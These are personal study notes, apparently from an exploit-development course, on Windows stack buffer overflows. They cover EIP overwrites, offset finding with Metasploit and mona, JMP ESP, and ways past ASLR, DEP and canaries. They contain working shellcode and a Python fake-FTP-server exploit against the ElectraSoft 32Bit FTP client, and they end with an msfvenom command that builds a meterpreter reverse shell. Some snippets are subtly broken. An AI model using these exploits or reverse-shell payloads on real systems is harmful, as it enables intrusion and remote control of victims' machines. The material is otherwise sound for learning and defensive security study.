## 3.1 understanding Buffer Overflow
buffer overflow happens, which is a condition in a program where a function attempts to copy more data into a buffer than it can hold

example:
```cpp
#define _CRT_SECURE_NO_DEPRECATE
#include <iostream>


int main(int argc, char** argv)
{
    //std::cout << "Hello World!\n";
    argv[1] = (char*)"AAAAAAAAAAAAAAAAAA";
    char buffer[10];
    strcpy(buffer, argv[1]);
    printf("It's all good!");
    return 0;
}
```
- The array of characters (buffer) is 10 bytes long.
- The code uses the function `strcpy`.
the code task : Try to copy more data than the buffer can handle, using strcpy.
We can see that argv[1] contains 35 A characters, while the buffer can handle only 10. When the program runs, the exceeding data has to go somewhere, and it will overwrite something in the memory: this is a buffer overflow.

**Resolution**: There is a safe version of the strcpy function, and it is called `strncpy` (notice the n in the function name).
```cpp
int main(int argc, char** argv)
{
argv[1] = (char*)"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
char buffer[10];
strncpy(buffer, argv[1], sizeof(buffer));
return 0;
}
```

**what happening  in the stack:**
 - Push the function parameters
 - Call the function
 -  Execute the prologue (which updates EBP and ESP to create the new stack frame)
 -  Allocate local variable
![[Pasted image 20251212123209.png]]

**What is getting overwritten?:**  the EBP, the EIP and all the other bytes related to the previous stack frame.
![[Pasted image 20251212123433.png]]
==so the Program will return to the `EIP` addr "AAAA" witch is wrong address==

---

another example :
```cpp
#define _CRT_SECURE_NO_DEPRECATE
#include <iostream>
#include <cstring>

int bf_overflow(char *str){
       char buffer[10];         //our buffer
       strcpy(buffer,str);      //the vulnerable command
       return 0;
}

int good_password(){            // a function which is never executed
       printf("Valid password supplied\n");
       printf("This is good_password function \n");
       return 0;
}

int main(int argc, char *argv[])
{
       int password=0; // controls whether password is valid or not
       printf("You are in goodpwd.exe now\n");
       bf_overflow(argv[1]); //call the function and pass user input
       if ( password == 1) {
             good_password(); //this should never happen
 }
         else {
       printf("Invalid Password!!!\n");
 }
       printf("Quitting sample1.exe\n");
       return 0;
}
```

**Program Objection:** Run the function good_password
**Code observation:** 
 - The function good_password is never executed. (int password=0)
 - bf_overflow contains the vulnerable function that will cause the buffer overflow.
**Goal:** call the good_password function to print `Valid password supplied`

**Test1:**
![[Pasted image 20251212124107.png]]
The program crashes, and if we debug it with Visual Studio, we will see the following message:
![[Pasted image 20251212124138.png]]
we can see that the program tried to access the location pointed to 0x41414141 (0x41 is the hexadecimal value of A).
- so the `EIP` overwritten.
**next Step** Craft an input that forces the program to jump into the memory address of the function:
 - how many 'A' we need 
 - what address do we want written in the `EIP` (good_password function addr)?

**Step 1:** find the `good_password` function address 
disassembler the perogram :
```cmd
objdump -d -Mintel goodpwd.exe > goodpwd_disassembled.txt
```
search for the function `good_password` 
![[Pasted image 20251212124732.png]]
-  good_password function is at address: `00401548`
What we have to do now is find the `EIP`.


**Step 2** : find how many "`A`" characters we need (the offset).
Now execute the same command, but adding one A character at the beginning each time:
```cmd
goodpwd.exe AAABCD
goodpwd.exe AAAABCD
goodpwd.exe AAAAABCD
and so on
```
At a certain point, we will trigger the buffer overflow causing the program to crash
![[Pasted image 20251212133504.png]]
 
 why we use `ABCD` at the end when we view the exception error, it will tell us what character we errored at . To do this, let us debug the program with Visual Studio 
 - First, open Visual Studio
-  Second, click on File->Open->NewProject
- Third, select the executable file [Exe Project Files (*.exe)], in our case goodpwd.exe.

Once the executable is loaded, you can open the program properties, using the wrench icon (or the shortcut Alt+Enter) and set the arguments of the program in the new panel that appears![[Pasted image 20251212133750.png]]
Once the arguments field is set, click on the green play button on the top bar to run the program.

You can stop the debugging by clicking on the stop button, change the arguments value and restart the debugger.
![[Pasted image 20251212134240.png]]
it seems that we have another buffer overflow, also called smashed the stack or stack
smashing. Reviewing the error, you should notice that the error was because of 0x15. This means that the EIP has not been overwritten with our data since 0x15 is not part of our input.

/try adding a few more A characters into our input until we see something like the following:![[Pasted image 20251212134306.png]]
The line "Access violation reading location 0x44434241" is what we want; this stands for ABCD using the hexadecimal (according to ASCII chart) values as follows 0x41(A), 0x42(B), 0x43(C),
0x44(D).
The application crashes because it cannot execute the instruction contained at that specific address in memory.
==What is happening is that the value ABCD is overwriting the correct EIP in the stack.==

> **Note**: you will see the `EIP` in the reverse order (`0x44434241`) because Windows uses l`ittle-endian` and thus, the most significant byte comes at the lowest position(`high memory`). As integer: `0x41424344` (MSB = 0x41 = 'A', LSB = 0x44 = 'D')  + **copying data is happen from the low memory to the high memory**

we have to replace the EIP (ABCD in our input) with the address of the good_password function `00401548` 
Since the command prompt does not allow us to supply hexadecimal data as an argument, we will need a helper application to exploit the program 

script that will to help us to pass the hexadecimal code as an argument.`00401548`
```c
import sys
import os
payload = "\x41"*22
payload += "\x48\x15\x40" // 00401548 in little endian 
command = "goodpwd.exe %s" %(payload)
print path
os.system(command)
```
>we did not add `\x00` to the payload since this is a NULL bytewe did not add coz functions such as strcpy encounter a NULL byte in the source string, they will stop copying data.

after we run the script We successfully called the good_password function!
![[Pasted image 20251212141917.png]]

## 3.2 Finding Buffer Overflow

**Where buffer overflows come from**
- Applications using **unsafe functions** may be vulnerable:
    - `strcpy`, `strcat`, `gets / fgets`
    - `printf / vsprintf`
    - `memcpy`
    - `scanf / fscanf`
- Vulnerability depends on **how the function is used**, not just its name.

**Common causes**
- No proper **input validation**
- No **boundary checking**
- Use of **unsafe languages** that allow direct memory access (e.g., C/C++)

**Safe vs unsafe languages**
- **Unsafe:** C, C++ (raw memory access, pointers)
- **Generally safe:** Interpreted / managed languages  
    (C#, VB, .NET, Java)
    
**Sources of overflow-triggering data**
- User input
- Data from disk (files)
- Network data

**Techniques to find buffer overflows**
- **Static analysis (source code available):**
    - Tools: `splint`, `Cppcheck`
    - Detect buffer overflows and other bugs
- **Debugger-based analysis:**
    - Analyze crashes to locate vulnerabilities and  Cloud fuzzing that  Automated crash discovery using file-based inputs
- **Fuzzing / dynamic analysis:**
  - tool like a fuzzer or tracer, which tracks all executions and the data flow, help in finding problems.

**Exploitability reality**
- Many vulnerabilities are **not exploitable**
- About 50% only lead to:
    - Denial of Service (DoS)
    - Other side effects

**Fuzzing overview**
- Testing technique using **invalid/random inputs**
- Input types:
    - Command line
    - Network
    - Files
    - Databases
    - Environment variables
    - Shared memory
    - Keyboard/mouse
- Looks for:
    - Crashes
    - Memory hogging
    - CPU hogging
- Crashes are logged for later analysis

**Limitations of fuzzing**
- Exponential and resource-intensive
- Cannot test all cases in practice

**Common fuzzing tools**
-  (http://peachfuzzer.com) Peach Fuzzing Platform
- (https://github.com/OpenRCE/sulley) Sulley
-   (https://github.com/orgcandman/Simple-Fuzzer) Sfuzz
-   (http://packetstormsecurity.com/files/39626/FileFuzz.zip.html) FileFuzz
### 3.2.1 Finding Buffer Overflow in Binary Programme  
- Start with a simple program to understand stack behavior.
- Clear understanding of the stack improves vulnerability research.
**Sample application**
- Program: `cookie.c`
```c
int cookie=0;
char buffer[4];
printf("cookie = %08X\n",cookie);
gets(buffer);
printf("cookie = %08X\n",cookie);
if(cookie == 0x31323334)
    printf("you win!\n");
else
    printf("try again!\n");
```
- **Disassemble the binary:**
```bash
   objdump.exe -d -Mintel cookie.exe > disasm.txt
```

- Compiler differences can produce different assembly results.
- Compare your compiled version with the provided one to spot differences.
- Look at the **commented disassembly** for clarity.

**Disassembly analysis**
```txt
00401290 <_main>:
  401290:	55                   	push   ebp
  401291:	89 e5                	mov    ebp,esp
  401293:	83 ec 18             	sub    esp,0x18 ;Setup stackframe
  401296:	83 e4 f0             	and    esp,0xfffffff0
  401299:	b8 00 00 00 00       	mov    eax,0x0 ;Calculate stack cookie
  40129e:	83 c0 0f             	add    eax,0xf ;The cookie is used
  4012a1:	83 c0 0f             	add    eax,0xf ;Detect stack overflow
  4012a4:	c1 e8 04             	shr    eax,0x4
  4012a7:	c1 e0 04             	shl    eax,0x4
  4012aa:	89 45 f4             	mov    DWORD PTR [ebp-0xc],eax
  4012ad:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
  4012b0:	e8 ab 04 00 00       	call   401760 <___chkstk>
  4012b5:	e8 46 01 00 00       	call   401400 <___main>
  4012ba:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [ebp-0x4],0x0 ;This is our cookie
  4012c1:	8b 45 fc             	mov    eax,DWORD PTR [ebp-0x4]
  4012c4:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax ;Points to cookie variable
  4012c8:	c7 04 24 00 30 40 00 	mov    DWORD PTR [esp],0x403000 ;Points to cookie = “%08X\n”
  4012cf:	e8 8c 05 00 00       	call   401860 <_printf>
  4012d4:	8d 45 f8             	lea    eax,[ebp-0x8]
  4012d7:	89 04 24             	mov    DWORD PTR [esp],eax
  4012da:	e8 71 05 00 00       	call   401850 <_gets> ;Call gets
  4012df:	8b 45 fc             	mov    eax,DWORD PTR [ebp-0x4]
  4012e2:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax ;Points to cookie variable
  4012e6:	c7 04 24 00 30 40 00 	mov    DWORD PTR [esp],0x403000 ;Points to cookie = “%08X\n”
  4012ed:	e8 6e 05 00 00       	call   401860 <_printf> ;Call printf function
  4012f2:	81 7d fc 34 33 32 31 	cmp    DWORD PTR [ebp-0x4],0x31323334 ;Compare value of cookie
  4012f9:	75 0e                	jne    401309 <_main+0x79>
  4012fb:	c7 04 24 0f 30 40 00 	mov    DWORD PTR [esp],0x40300f ;The if condition
  401302:	e8 59 05 00 00       	call   401860 <_printf> ;Print “you win”
  401307:	eb 0c                	jmp    401315 <_main+0x85>
  401309:	c7 04 24 19 30 40 00 	mov    DWORD PTR [esp],0x403019
  401310:	e8 4b 05 00 00       	call   401860 <_printf> ;Print “try again”
  401315:	c9                   	leave  
  401316:	c3                   	ret      
```
- Identify the `main` function.
- Correlate C source code with assembly instructions.
- Typical stack operations:
    - `push ebp` → save base pointer
    - `mov ebp, esp` → setup stack frame
    - `sub esp, 0x18` → allocate stack space
    - `mov eax, 0x0` → prepare stack cookie
- Function calls:
    - `call _printf`
    - `call _gets`
- Buffer overflow occurs when input to `gets(buffer)` overwrites `cookie`.

- Assembly shows:
    - Loading/storing the cookie variable
    - Comparison with expected value (`0x31323334`)
- Overflow allows changing `cookie` to trigger "you win!" message.
### 3.2.2 Code Observation 
![[Pasted image 20251217115852.png]]
buffer[4] is 4 bytes long (so 32 bits and 1 location).
accessing variables :
-` [EBP – x]  OR [ESP + x]` → local variables OR 
-  `[EBP + x]` → function parameters
>(square brackets "`[]`" in assembly mean pointing to data stored at memory location [EBP + x] and not the value `EBP + X`. ) 

the main function stack frame is as follows:
-  [EBP-12]-> Compiler induced “stack verifying cookie” (we don’t care about this)
 - [EBP-8]-> array buffer
-  [EBP-4]-> variable cookie

we can see that user-input is not verified and therefore, has a buffer overflow vulnerability.
because, the function gets never verifies the length of the data (also note stack space is limited) and in this case, user has full control over the data. Therefore, it is susceptible to an
overflow.
### 3.2.3 Overflow the Buffer
Now, it is time to exploit the information obtained above:
-   we have complete controle over buffer input with `gets(buffer);`
We can run the program cookie.exe and then type `111111111` 
```cmd
.\cookie.exe
cookie = 00000000
111111111
cookie = 31313131
try again!
```
the current value is `0x31313131`. ASCII code for 1 is 0x31, for 2 it's 0x32 and so on

we can also perform the above steps in Immunity Debugger to see how things change in real time.
Another great tool that will help you identify buffer overflows is IDA Pro http://www.hex-rays.com.
Open the cookie.exe program in IDA and observe what happens. IDA Pro shows the stack frame on top of every function:

## 3.3 Exploiting Buffer Overflow 
how can we exploit this vulnerability? Since we already know how the `good password` program works we will exploit it  to popup the `calc.exe` program  
payload to overwrite the `EIP` is `AAAAAAAAAAAAAAAAAAAAAAABCD`![[Pasted image 20251217200933.png]]
So the stack looks like the following:
![[Pasted image 20251217200955.png]]

in order to execute our `shellcode`, we will have to overwrite the `EIP` (ABCD) with the address of our `shellcode`.
Since ESP points to the next address after the return address location in memory (OTHER), we can place the shellcode starting from that location!
```bash
Junk Bytes (22 bytes) + EIP address (4 bytes) + Shellcode
```

### 3.3.1 Finding the right offset 
in real target Knowing the correct amount of junk bytes needed to overwrite the EIP address may be tedious and time-consuming if we had to do it manually.

**manually:**
- example if  we crashed the application with 1500 bytes,we will check if it still crashes (and if the EIP gets overwritten) by sending 1500/2 bytes = 750 bytes
- If the applications crashes, we will continue splitting the mount by 2(750/2).
- If the application doesn’t crash, we will add half of the amount to our bytes: 750+(750/2) = 1125. This is a number between 750 and 1500.

**using scripts & tools:** (short) 
**with metasploit:**
creates a payload that is as long as the number we specify
```bash
msf-pattern_create -l 100 
```
Copy the ASCII payload and use it as the command argument  in the good password application
**in immunity debugger** : `debug >> argument` 
**in x64dbg:** `file >> change command argument`

after the application crashe !! we obtain the overwritten value
![[Pasted image 20251218121239.png]]
example: `0x61413761` copy this value and use it 
```bash
msf-pattern_offset -q 0x61413761
  # [*] Exact match at offset 22
```
it returns `22`! This is the exact offset that we manually calculated before.


now using **mona** plugin:
-  copy [[https://github.com/corelan/mona|mona]] repository file to into the `PyCommand` folder (inside theImmunity Debugger installation folder)
- open immunity debugger and load the application 
- set the working folder `!mona config -set workingfolder C:\ImmunityLogs\%p`
- create the pattern 
  ```bash
  !mona pc 100
  ```
  we can see the value of EIP once the application crashes. Once again it is `61413761`
- find the offset 
```bash
!mona po 61413761
```
![[Pasted image 20251218123514.png]]
Mona returns that the correct pattern is at the position `22`.

we can also do the process automatically by using the commnad 
```bash
!mona suggest
``` 
![[Pasted image 20251218123435.png]]

You will find all the files in the working directory.

### 3.3.2 Overwrite The EIP
we have to overwrite the EIP with a value to return to our shellcode and excute it 
note that the shellcode located on the ESP , so we need to jump to `esp` 
- What we can do is find a JMP ESP (or CALL ESP) instruction that is in a fixed location of memory.

In environments where `ASLR` is not enabled, we know that `kernel32.dll` functions are located at fixed addresses in memory; this allows us to perform a `JMP ESP` or a `CALL ESP` to the
process address space, a line in `kernel32.dll`

***how to find `JMP ESP` or a `CALL ESP` :***
- To disassemble a .dll you can load it into Immunity Debugger (or IDA)  right-click on the disassemble panel and select Search for > Command (or use the shortcut CTRL+F) type
JMP ESP or CALL ESP and then confirm . and then search for one of two commands: `CALL ESP or JMP ESP` keep search by hitting CTRL+L.
-  search for all the modules loaded in the program (or .dll), Search for -> All Commands in all modules; this returns a list of all the modules and the occurrences of the pattern searched.

- anther way use `findjmp2` tool : search for any pattern regarding the ESP registry, in the ntdll.dll file:![[Pasted image 20251218141617.png]]

-  use `mona` : `-r `is used to specify the register
```bash
!mona jmp -r esp
!mona jmp -r esp -m kernel  # or specify a dll 
```
![[Pasted image 20251218141858.png]]


example we find : `Address=77267D3B Message= 0x77267d3b (b+0x00097d3b) : jmp esp | asciiprint`
>In order to correctly write this address, we will have towrite it in little-endian. Hence, the hexadecimal value in our exploit program will be \x3B\x7D\x26\x77 and not \x77\x26\x7D\x3B.

Now that we have the address of a CALL ESP, we need to create a payload that exploits the buffer overflow vulnerability.
Since we can't write hexadecimal values directly into our command prompt, we will edit the goodpwd.cpp program and add the shellcode in there.

```c
#include <iostream> 
#include <cstring>

 
int bf_overflow(char *str){ 
       char buffer[10]; 	//our buffer 
       strcpy(buffer,str);	//the vulnerable command 
       return 0; 
} 
 
int good_password(){ 		// a function which is never executed
       printf("Valid password supplied\n"); 
       printf("This is good_password function \n"); 
}
 
int main(int argc, char *argv[]) 
{ 
       	int password=0; // controls whether password is valid or not 
       	printf("You are in goodpwd.exe now\n");
	   
	   	char junkbytes[50];   //Junk bytes before reaching the EIP
	  	memset(junkbytes,0x41,22);	
       	char eip[] = "\x3B\x7D\x26\x77";
       	char shellcode[] =  //Shellcode that follows the EIP - this calls calc.exe 
		"\x90\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
		"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
		"\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01"
		"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75"
		"\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
		"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
		"\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53"
		"\x53\x53\x53\x53\x52\x53\xff\xd7";


		char command[2000];	
		strcat(command, junkbytes);
		strcat(command, eip);
		strcat(command, shellcode);	
	   
       	bf_overflow(command); //call the function and pass user input 
       	if ( password == 1) { 
            good_password(); //this should never happen  
 }
 	 else {
       printf("Invalid Password!!!\n");
 } 
       printf("Quitting sample1.exe\n"); 
       return 0; 
} 
```
This program calls goodpwd.exe and passes the content of the variable command as an argument. The variable command is composed as follows: Junk bytes + EIP + Shellcode.
![[Pasted image 20251218143642.png]]

![[Pasted image 20251218143703.png]]

![[Pasted image 20251218143814.png]]


## 3.4 Exploit Real-World Buffer Overflow
target is called `ElectraSoft 32Bit FTP `, an ftp client  program

load the `ElectraSoft 32Bit FTP` program to to Immunity debugger, and run it 
- Create a payload (try using Mona
```bash
!mona pc 1100
```
then copy the` HEX pattern ` to the our `FTP Server` in our machine here the ftp script:
```python
#!/usr/bin/python

from socket import *

payload = "<HEX PATTERN HERE>"
s = socket(AF_INET, SOCK_STREAM)
s.bind(("0.0.0.0", 21))
s.listen(1)
print "[+] Listening on [FTP] 21"
c, addr = s.accept()

print "[+] Connection accepted from: %s" % (addr[0])

c.send("220 "+payload+"\r\n")
c.recv(1024)
c.close()
print "[+] Client exploited !! quitting"
s.close()
```
and run the server 
`ElectraSoft 32Bit FTP` program t on  Click on “Connect” it will crash  and read the `EIP` overwritten  in `Immunity debugger`
![[Pasted image 20251219114721.png]]
EIP = `30684239`, let find the offset using mona again:
```bash
!mona po 30684239
```
![[Pasted image 20251219114848.png]]
offset = `989` bytes before reaching the `EIP`.
let find the `jmp esp` using mona 
```bash
!mona jmp -r esp -m kernel
```
![[Pasted image 20251219114949.png]]
now after we find the offset = `989` and the jmp esp = `7C86467B`  we will set it to our payload with the `shellcode` of the `calc.exe`:
```python
#!/usr/bin/python

from socket import *
payload = "\xc3"*989 # Junk bytes
payload += "\x7B\x46\x86\x7c" # jmp esp kernerlbase.dll Log data : 7C86467B
#Shellcode for calc.exe - notice the NOPS at the beginning
payload += ( "\x90\x90\x90\x90\x90\x90\x90\x90"
"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
"\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
"\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
"\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73"
"\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61"
"\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7")

s = socket(AF_INET, SOCK_STREAM)
s.bind(("0.0.0.0", 21))
s.listen(1)
print "[+] Listening on [FTP] 21"
c, addr = s.accept()

print "[+] Connection accepted from: %s" % (addr[0])

c.send("220 "+payload+"\r\n")
c.recv(1024)
c.close()
print "[+] Client exploited !! quitting"
s.close()
```
![[Pasted image 20251219115233.png]]
**the calc.exe executed !!**

---
## 3.5 Security Implementation 
before we bypass them we need to  know how they work
### 3.5.1 Helpful tools
EMET (Enhanced Mitigation Experience Toolkit)  [[https://support.microsoft.com/en-us/kb/2458544]]is a utility that helps prevent vulnerabilities in software from being successfully exploited. EMET offers many different mitigation technologies, such as DEP, ASLR, SEHOP and more,it can also be used to disable them![[Pasted image 20251219124326.png]]

>It is important to note that on newer operating systems, ASLR, DEP and SEHOP cannot be completely disabled.
### 3.5.2 Address Space Layout Randomization (ASLR)
**Address space layout randomization (ASLR)** is to introduce randomness for executables, libraries, and stack in process address space, making it more difficult for an attacker to predict memory addresses.
When ASLR is activated, the OS loads the same executable at different locations in memory every time (`at every reboot)`.
If we reboot the system, the exploit will not work anymore. This happens because not only will the address of our` CALL/JMP ESP` **be different each time**, it will also be different for each machine with the same Operating System

in windows xp `ASLR` is `not enabled`

ASLR is not enabled for all modules. This means that if a process has ASLR enabled, there could be a dll (or another module) in the address space that does not use it, making the process vulnerable to ASLR bypass attack, 

we can check the `ASLR`  with **Process Explorer**.[[http://technet.microsoft.com/en-us/sysinternals/bb896653]]![[Pasted image 20251219125126.png]]

**or check the ASLR using mona:** 
```bash
!mona modules
```
![[Pasted image 20251219125217.png]]
**to list the modules that do not have ASLR enabled**
```bash
!mona noaslr
```
#### 3.5.2.1 Bypass Technique 
There are different methods that we can use.You can find great resources about these topics [here](https://www.corelan.be/)
##### Non-Randomized Modules
This technique aims to find a module that does not have ASLR enabled and then use a simple JMP/CALL ESP from that module.
##### Bruteforce 
With this method, ASLR can be forced by overwriting the return pointer with plausible addresses until, at some point, we reach the shellcode.

The success of pure brute-force depends on how tolerant an exploit is to variations in the address space layout (e.g., how many NOPs can be placed in the buffer), and on how many exploitation attempts one can perform.
This method is typically applied against those services configured to be automatically restarted after a crash.
##### Nop-Sed
we create a big area of NOPs in order to increase the chances to jump to this area.the
more chances we have to land on one of these NOPs.
The advantage of this technique is that the attacker can guess the jump location with a low degree of accuracy and still successfully exploit the progra

Otherwise here are some good references that you can use to start
diving into bypassing ASLR+DEP:
• https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/
• https://www.exploit-db.com/docs/english/17914-bypassing-aslrdep.pdf
• https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/

### 3.5.3 Data Execution Prevention (DEP)
preventing the execution of code from pages of memory that are not explicitly marked as executable.
the DEP to disable it before executing the actual shellcode.
#### 3.5.2.1 Bypass Technique 
Bypassing DEP is possible by using a very smart technique called` Return-Oriented Programming (ROP)`
ROP consists of finding multiple machine instructions in the program (called gadget), in order to create a chain of instructions that do something.

The RET is important since it will allow the chain to work and keep jumping to the next address after executing the small set of intructions.

The purposes of the entire chain are different. We can use ROP gadgets to call a memory protection function (kernel API such as VirtualProtect) that can be used to mark the stack as executable; this will allow us to run our shellcode as we have seen in the previous examples.

But we can also use ROP gadgets to execute direct commands or copy data into executable regions and then jump to it.

Mona offers a great feature that generates the ROP gadget chain for us, or that will at least help us to find all the ROP gadgets that we can use

[here](https://www.corelan.be/index.php/security/rop-gadgets/) you can find a list of ROP gadgets from different libraries and
.dll files, 
while [here](https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/#buildingblocks) you can find a good article that goes deeper in ROP gadgets.

#### 3.5.2.2 Protection 
In order to avoid the exploit of such techniques, ASLR was introduced. By making kernel API’s load at random addresses, bypassing DEP becomes hard.

If both DEP and ASLR are enabled, code execution is sometimes impossible to achieve in one attempt.

### 3.5.4 Stack Canary And SafeSEH
The term canary comes from the canary in a coal mine, and its purpose is to modify almost all the function’s prologue and epilogue instructions in order to place a small random integer value (canary) right before the return instruction, and detect if a buffer overflow occurs.

overflows overwrite memory address locations in the stack right before the return pointer; this means that the canary value will be overwritten too.![[Pasted image 20251219132404.png]]
#### 3.5.4.1 Bypass
In order to bypass this security implementation, one can try to retrieve or guess the canary value, and add it to the payload

Beside guessing, retrieving or calculating the canary value, David Litchfield developed a method that does not require any of these. If the canary does not match, the exception handler will be triggered. If the attacker can overwrite the Exception Handler Structure (SEH) and trigger an exception before the canary value is checked, the buffer overflow could still be executed

#### 3.5.4.2 Protection
This introduced a new security measures called SafeSEH.
You can read more about it SafeSEH [here](https://msdn.microsoft.com/en-us/library/9a89h429.aspx), and [here](https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/) you can find a very good article on how to bypass stack canary.


## create shellcode
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.102.163 LPORT=4444 -f c
```
![[Pasted image 20251219133447.png]]

